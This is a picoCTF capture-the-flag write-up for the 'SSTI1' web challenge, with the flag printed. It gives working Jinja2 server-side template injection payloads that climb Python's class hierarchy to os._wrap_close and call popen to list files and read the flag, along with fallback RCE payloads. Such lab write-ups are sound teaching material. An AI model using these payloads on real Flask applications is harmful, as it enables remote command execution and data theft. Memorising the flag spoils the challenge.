---
title: "SSTI1"
platform: "picoCTF"
category: "Web Exploitation"
difficulty: "Medium"
date: 2025-12-22
tags: ["web", "SSTI", "Jinja2", "Python", "RCE"]
time_spent: "30m"
license: "CC BY 4.0"
---

# TL;DR

Discovered a Server-Side Template Injection (SSTI) vulnerability in a field that reflects user input. By navigating Python's Method Resolution Order (MRO), I accessed the `os._wrap_close` class, which allowed me to execute shell commands. Listing the directory revealed a `flag` file, which I read to solve the challenge.

**picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}**

# Challenge

[picoCTF - **SSTI1**](https://play.picoctf.org/practice/challenge/492) - Can you exploit the server-side template injection to find the flag? The application allows you to input a name, but it doesn't seem to be sanitizing what you put in.

# What I needed

* **Browser:** Any modern browser (Chrome/Firefox).
* **Payloads:** Jinja2 injection strings.
* **Python Knowledge:** Understanding of `__mro__` and `__subclasses__`.

# Summary (what you will do)

1.  **Test for SSTI:** Input `{{7*7}}` to confirm the server evaluates expressions.
2.  **Inspect Environment:** Use `{{ config.items() }}` to identify the framework (Flask).
3.  **Find a Gadget:** Navigate the class hierarchy to find a class linked to the `os` module.
4.  **Locate the Index:** Identify the specific position of the `os._wrap_close` class in the subclasses list.
5.  **Remote Code Execution (RCE):** Use `popen` to list files and read the flag.

# Step-by-step walkthrough

## 1) Confirmation & Fingerprinting
I started by testing if the input field was vulnerable. I entered `{{7*7}}` into the input field. 

**Result:** The page displayed **49**. 
This confirmed the server uses the **Jinja2** template engine (common in Flask apps) and that it executes code inside double curly braces.

## 2) Dumping the Config
To see what variables were available, I injected:
`{{ config.items() }}`

The output showed standard Flask configuration keys like `DEBUG`, `SECRET_KEY`, and `SESSION_COOKIE_NAME`. This confirmed we were working in a standard Python/Flask environment.



## 3) The "Magic" Class Hunt
In Python, all classes eventually inherit from the base `object`. By using a string `''`, we can "climb up" to the object class and then "look down" at every other class loaded in the system's memory.

**Payload:** `{{ ''.__class__.__mro__[1].__subclasses__() }}`

* `''.__class__`: Gets the class of a string (`<class 'str'>`).
* `.__mro__[1]`: Accesses the **Method Resolution Order**. Index `1` is always the base class `object`.
* `.__subclasses__()`: Returns a list of every class currently active in the Python interpreter.

## 4) Why `os._wrap_close` and Finding Index [132]?

This is the most critical part of the exploit. We need a "Gadget"—a class that has access to the operating system.

### Why `os._wrap_close`?
Many classes in Python are "sandboxed," meaning they can't touch the file system. However, `os._wrap_close` is a built-in class used for file handling that happens to have the `os` module in its global namespace. By accessing this class, we can "borrow" its access to `popen` (which runs shell commands).

### How to find the Index [132]?
The subclasses list returned in Step 3 is massive. To find the index without counting by hand, you have two options:

1.  **Local Python Script:** Copy the entire output list from the browser, save it to a variable in a local Python script, and use `.index()`:
    ```python
    # Example local script
    classes = [ <paste_the_massive_list_here> ]
    for i, name in enumerate(classes):
        if "os._wrap_close" in str(name):
            print(f"Index is: {i}")
    ```
2.  **Jinja2 Loop:** If the server allows it, you can use a loop in the payload itself to find it:
    `{% for i in range(200) %} {{i}}: {{ "".__class__.__mro__[1].__subclasses__()[i] }} {% endfor %}`

In this specific challenge environment, `os._wrap_close` was located at index **132**.

## 5) Executing Commands
Once the index was known, I used the `popen` function to interact with the server's shell.

**List files:**
`{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls').read() }}`
**Output:** `__pycache__ app.py flag requirements.txt`

**Read the flag:**
`{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat flag').read() }}`

# Troubleshooting tips & explanations

## Why did index 132 work?
The index of classes in `__subclasses__()` depends entirely on which libraries the developer imported. On my local machine, it might be index 100, but on the picoCTF server, it was 132. Always verify the index for the specific environment you are attacking.

## What if `popen` is blocked?
If `popen` is filtered, you can try other methods such as:
* `__import__('os').system()`
* Using the `request` object: `{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}`

© 2025 Leander Steffan - CC BY 4.0.
Suggested attribution when reusing or quoting: Content by Leander Steffan - CC BY 4.0 - [https://github.com/LeanderSteffan/ctf-writeups](https://github.com/LeanderSteffan/ctf-writeups)
